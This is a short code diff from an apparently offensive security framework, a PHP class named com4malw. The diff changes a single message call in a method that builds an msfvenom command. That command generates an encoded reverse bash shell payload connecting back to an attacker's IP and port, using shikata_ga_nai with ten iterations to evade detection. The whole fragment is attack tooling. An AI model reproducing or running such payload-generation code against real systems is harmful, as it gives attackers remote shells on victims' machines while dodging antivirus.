@@ -79,7 +79,7 @@ class com4malw extends com4obj {
     
     public function rev8msf_bash($attacker_ip,$attacker_port,$shell){
         $this->ssTitre(__FUNCTION__);
-        $this->rouge("This will not work on most Debian-based Linux distributions (including Ubuntu) because they compile bash without the /dev/tcp feature.");
+        $this->note("This will not work on most Debian-based Linux distributions (including Ubuntu) because they compile bash without the /dev/tcp feature.");
         $query = "msfvenom -p cmd/unix/reverse_bash LHOST=$this->attacker_ip LPORT=$this->attacker_port --platform unix --encoder  x86/shikata_ga_nai  --iterations 10 --format bash ";
         return $this->req_ret_str($query);
     }
